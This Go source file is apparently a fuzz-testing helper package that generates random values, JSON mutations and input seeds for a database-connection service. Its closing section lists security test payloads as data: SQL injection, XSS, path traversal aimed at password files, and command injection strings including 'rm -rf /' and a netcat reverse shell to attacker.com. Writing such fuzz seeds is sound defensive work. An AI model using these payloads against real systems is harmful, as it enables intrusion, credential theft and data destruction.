// Package generators provides random data generation utilities for fuzz testing.
// Note: This package intentionally uses math/rand instead of crypto/rand because
// cryptographic randomness is not required for fuzz test data generation.
package generators

import (
	"encoding/json"
	"math/rand" // #nosec G404 - Weak RNG is acceptable for fuzz test generation
	"strings"

	"github.com/google/uuid"
)

// RandomString generates a random string of given length
func RandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))] // #nosec G404
	}

	return string(b)
}

// RandomConfigName generates a valid config name (alphanumeric, underscore, hyphen)
func RandomConfigName(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))] // #nosec G404
	}

	return string(b)
}

// RandomDBType returns a random valid DB type
func RandomDBType() string {
	types := []string{"ORACLE", "SQL_SERVER", "POSTGRESQL", "MONGODB", "MYSQL"}
	return types[rand.Intn(len(types))] // #nosec G404
}

// RandomInvalidDBType returns an invalid DB type
func RandomInvalidDBType() string {
	invalid := []string{"SQLITE", "REDIS", "CASSANDRA", "", "postgresql", "invalid"}
	return invalid[rand.Intn(len(invalid))] // #nosec G404
}

// RandomPort generates a random port number
func RandomPort() int {
	return rand.Intn(65535) + 1 // #nosec G404
}

// RandomInvalidPort generates an invalid port
func RandomInvalidPort() int {
	invalid := []int{0, -1, -100, 65536, 100000}
	return invalid[rand.Intn(len(invalid))] // #nosec G404
}

// RandomUUID generates a random UUID string
func RandomUUID() string {
	return uuid.New().String()
}

// RandomInvalidUUID generates an invalid UUID string
func RandomInvalidUUID() string {
	invalid := []string{
		"",
		"not-a-uuid",
		"12345678-1234-1234-1234-1234567890",     // too short
		"12345678-1234-1234-1234-1234567890abcd", // too long
		"gggggggg-gggg-gggg-gggg-gggggggggggg",   // invalid characters
		"12345678123412341234123456789012",       // no hyphens
	}

	return invalid[rand.Intn(len(invalid))] // #nosec G404
}

// mutator is a function type for JSON mutation operations
type mutator func([]byte) []byte

// mutators defines the available mutation strategies for fuzz testing
var mutators = []mutator{
	mutateRemoveBytes,
	mutateInsertBytes,
	mutateInvalidUTF8,
	mutateTruncate,
	mutateAddGarbage,
	mutateSwapQuotes,
	mutateRemoveClosingBrace,
	mutateDoubleOpeningBrace,
	mutateChangeType,
	mutateAddUnknownField,
}

// MutateJSON mutates a JSON byte slice for fuzzing
func MutateJSON(data []byte, mutationType int) []byte {
	idx := mutationType % len(mutators)
	return mutators[idx](data)
}

func mutateRemoveBytes(data []byte) []byte {
	if len(data) > 5 {
		pos := rand.Intn(len(data) - 1) // #nosec G404
		return append(data[:pos], data[pos+1:]...)
	}

	return data
}

func mutateInsertBytes(data []byte) []byte {
	if len(data) > 0 {
		pos := rand.Intn(len(data))      // #nosec G404
		randByte := byte(rand.Intn(256)) // #nosec G404

		return append(data[:pos], append([]byte{randByte}, data[pos:]...)...)
	}

	return data
}

func mutateInvalidUTF8(data []byte) []byte {
	if len(data) > 0 {
		pos := rand.Intn(len(data)) // #nosec G404
		result := make([]byte, len(data))
		copy(result, data)
		result[pos] = 0xFF

		return result
	}

	return data
}

func mutateTruncate(data []byte) []byte {
	if len(data) > 10 {
		return data[:len(data)/2]
	}

	return data
}

func mutateAddGarbage(data []byte) []byte {
	return append(data, []byte("}{]garbage")...)
}

func mutateSwapQuotes(data []byte) []byte {
	return []byte(strings.ReplaceAll(string(data), `"`, `'`))
}

func mutateRemoveClosingBrace(data []byte) []byte {
	if len(data) > 0 && data[len(data)-1] == '}' {
		return data[:len(data)-1]
	}

	return data
}

func mutateDoubleOpeningBrace(data []byte) []byte {
	return append([]byte("{"), data...)
}

func mutateChangeType(data []byte) []byte {
	str := string(data)
	str = strings.ReplaceAll(str, `"test"`, `12345`)

	return []byte(str)
}

func mutateAddUnknownField(data []byte) []byte {
	var m map[string]any
	if err := json.Unmarshal(data, &m); err == nil {
		m["unknownField"] = "fuzz"
		if result, err := json.Marshal(m); err == nil {
			return result
		}
	}

	return data
}

// GenerateConnectionInputSeed generates a seed for ConnectionInput fuzzing
func GenerateConnectionInputSeed() []byte {
	input := map[string]any{
		"configName":   "test-db",
		"type":         "POSTGRESQL",
		"host":         "localhost",
		"port":         5432,
		"databaseName": "testdb",
		"username":     "user",
		"password":     "pass",
	}

	data, err := json.Marshal(input)
	if err != nil {
		return []byte(`{"configName":"test-db","type":"POSTGRESQL"}`)
	}

	return data
}

// GenerateFetcherRequestSeed generates a seed for FetcherRequest fuzzing
func GenerateFetcherRequestSeed() []byte {
	input := map[string]any{
		"dataRequest": map[string]any{
			"mappedFields": map[string]any{
				"db1": map[string]any{
					"table1": []string{"field1", "field2"},
				},
			},
		},
	}

	data, err := json.Marshal(input)
	if err != nil {
		return []byte(`{"dataRequest":{"mappedFields":{}}}`)
	}

	return data
}

// GenerateSchemaValidationSeed generates a seed for SchemaValidation fuzzing
func GenerateSchemaValidationSeed() []byte {
	input := map[string]any{
		"mappedFields": map[string]any{
			"datasource1": map[string]any{
				"table1": []string{"field1"},
			},
		},
	}

	data, err := json.Marshal(input)
	if err != nil {
		return []byte(`{"mappedFields":{}}`)
	}

	return data
}

// GenerateExtractExternalDataSeed generates a seed for worker message fuzzing
func GenerateExtractExternalDataSeed() []byte {
	input := map[string]any{
		"jobId":          uuid.New().String(),
		"organizationId": uuid.New().String(),
		"mappedFields": map[string]any{
			"db1": map[string]any{
				"table1": []string{"field1"},
			},
		},
		"filters": map[string]any{},
	}

	data, err := json.Marshal(input)
	if err != nil {
		return []byte(`{"jobId":"","organizationId":"","mappedFields":{}}`)
	}

	return data
}

// Security test seeds for OWASP Top 10 coverage

// SQLInjectionSeeds provides payloads for SQL injection testing (OWASP A03:2021)
var SQLInjectionSeeds = []string{
	"'; DROP TABLE users; --",
	"1' OR '1'='1",
	"1; SELECT * FROM credentials; --",
	"admin'--",
	"' UNION SELECT password FROM users--",
	"1); DELETE FROM connections; --",
	"' WAITFOR DELAY '0:0:10'--",
	"1' AND 1=1--",
	"'; EXEC xp_cmdshell('dir'); --",
	"' OR 1=1#",
}

// XSSSeeds provides payloads for XSS testing (OWASP A03:2021)
var XSSSeeds = []string{
	"<script>alert('xss')</script>",
	"<img src=x onerror=alert('xss')>",
	"javascript:alert('xss')",
	"<svg/onload=alert('xss')>",
	"'\"><script>alert('xss')</script>",
	"<body onload=alert('xss')>",
	"{{constructor.constructor('alert(1)')()}}",
	"${7*7}",
}

// CommandInjectionSeeds provides payloads for command injection testing
var CommandInjectionSeeds = []string{
	"; ls -la",
	"| cat /etc/passwd",
	"$(whoami)",
	"`id`",
	"&& cat /etc/shadow",
	"; rm -rf /",
	"| nc attacker.com 4444 -e /bin/sh",
}

// PathTraversalSeeds provides payloads for path traversal testing (OWASP A01:2021)
var PathTraversalSeeds = []string{
	"../../../etc/passwd",
	"..\\..\\..\\windows\\system32\\config\\sam",
	"....//....//....//etc/passwd",
	"%2e%2e%2f%2e%2e%2f",
	"..;/..;/",
	"..%00/",
}

// UnicodeBypassSeeds provides Unicode-based bypass payloads
var UnicodeBypassSeeds = []string{
	"\u003cscript\u003ealert(1)\u003c/script\u003e",
	"\u0000",
	"\ufeff",
	"\u202e",
}

// LIKEWildcardSeeds provides payloads for LIKE operator abuse
var LIKEWildcardSeeds = []string{
	"%",
	"_",
	"[a-z]%",
	"%\\%",
	"%_%_%_%_%_%_%_%_%_%_%",
	"%' OR '1'='1",
}

// GetSecuritySeedBytes returns all security seeds as JSON byte slices for connection input
func GetSecuritySeedBytes() [][]byte {
	var seeds [][]byte

	for _, sql := range SQLInjectionSeeds {
		input := map[string]any{
			"configName":   sql,
			"type":         "POSTGRESQL",
			"host":         sql,
			"databaseName": sql,
			"username":     sql,
			"password":     sql,
		}
		if data, err := json.Marshal(input); err == nil {
			seeds = append(seeds, data)
		}
	}

	for _, xss := range XSSSeeds {
		input := map[string]any{
			"configName":   xss,
			"type":         "POSTGRESQL",
			"host":         "localhost",
			"port":         5432,
			"databaseName": xss,
		}
		if data, err := json.Marshal(input); err == nil {
			seeds = append(seeds, data)
		}
	}

	return seeds
}
